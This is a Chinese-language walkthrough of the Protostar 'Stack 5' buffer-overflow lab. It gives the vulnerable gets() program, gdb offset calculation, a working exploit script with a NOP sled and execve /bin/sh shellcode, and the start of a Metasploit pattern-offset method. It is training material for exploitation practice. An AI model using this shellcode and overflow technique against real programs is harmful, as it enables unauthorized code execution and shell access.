# Stack 5

## （一） 题目：

\#include &lt;stdlib.h&gt;

\#include &lt;unistd.h&gt;

\#include &lt;stdio.h&gt;

\#include &lt;string.h&gt;

int main\(int argc, char \*\*argv\)

{

char buffer\[64\];

gets\(buffer\);

}

## （二）解题过程：

gdb 调试 stack5程序，在ret函数上下断点。

b 16

r

输入aaaaaaaaa

i r

print $esp

print $ebp

查看此时的内存布局 ，找到buff 和 ret的距离就可以计算出需要填充多少字节，恰好覆盖到ret地址，返回地址后面是argc argv

esp    buffer开始         buffer结束（ebp  ret\)   argc argv

esp                    esp+0x10        ebp                 ret                   argc              argv

0xbffffcd0     0xbffffce0      0xbffffd28    0xbffffd2c   0x00000001   0xbffffdd4

![](/png/15.png)

如图所示：构造payload

buff\[0\]+ 0x4c+ 返回地址+ shellcode

exploit

python -c "print 'a'\*76+'\x30\xfc\xff\xbf'+'\x90'\*20+shellcode

import struct

pad = "\x41" \* 76

EIP = struct.pack\("I", 0xbffffd30\)

shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

NOP = "\x90" \* 100

print pad + EIP + NOP + shellcode

![](/png/10.png)

![](/png/16.png)

方法2：快速定位漏洞触发的位置并写出exploit

第一种方法是手工定位，计算填充的字节数和eip返回地址。下面这种 方法借助于定位脚本快速定位。

思路

1）判断是否存在漏洞，先给buffer填充100个a看看是否崩溃。

![](/png/18.png)

显然，出现了熟悉的段错误。通常，我们会调试.coredump的方法找到出错的位置。现在我们用最基础最快速的方法来定位。（调试dump）下一种方法给出。

2）用kali metasploit环境下的pattern\__create.rb脚本来生成要填充的标志性的字符串，再用pattern_\_offset来定位漏洞触发的位置。

![](/png/19.png)



Ref：

[https://xz.aliyun.com/t/3908](https://xz.aliyun.com/t/3908)

[https://0xrick.github.io/binary-exploitation/bof5/](https://0xrick.github.io/binary-exploitation/bof5/)

